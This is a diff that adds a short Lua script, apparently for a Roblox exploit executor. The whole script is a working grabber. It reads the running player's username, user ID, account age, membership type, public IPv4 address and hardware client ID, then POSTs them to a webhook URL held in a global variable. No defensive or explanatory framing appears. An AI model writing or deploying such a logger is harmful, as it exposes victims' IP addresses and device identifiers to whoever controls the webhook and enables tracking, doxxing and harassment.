@@ -1,0 +1,47 @@
+local Webhook = _G.Webhook
+
+local IPv4 = game:HttpGet("https://v4.ident.me/")
+
+local Headers = {["content-type"] = "application/json"} 
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local ipstuff =  {
+       ["content"] = "",
+       ["embeds"] = {{
+           ["title"] = "**Username**:",
+           ["description"] =  LocalPlayer.Name,
+           ["color"] = tonumber(0x1B6EA1),
+           ["fields"] = {
+               {
+                   ["name"] = "MembershipType:",
+                   ["value"] = tostring(game.Players.LocalPlayer.MembershipType),
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "AccountAge:",
+                   ["value"] = LocalPlayer.AccountAge,
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "UserId:",
+                   ["value"] = LocalPlayer.UserId,
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "IPv4:",
+                   ["value"] = game:HttpGet("https://v4.ident.me/"),
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "HWID:",
+                   ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                   ["inline"] = true
+},
+           },
+       }}
+   }
+
+
+
+
+http_request({Url=Webhook, Body=game:GetService('HttpService'):JSONEncode(ipstuff), Method="POST", Headers=Headers})
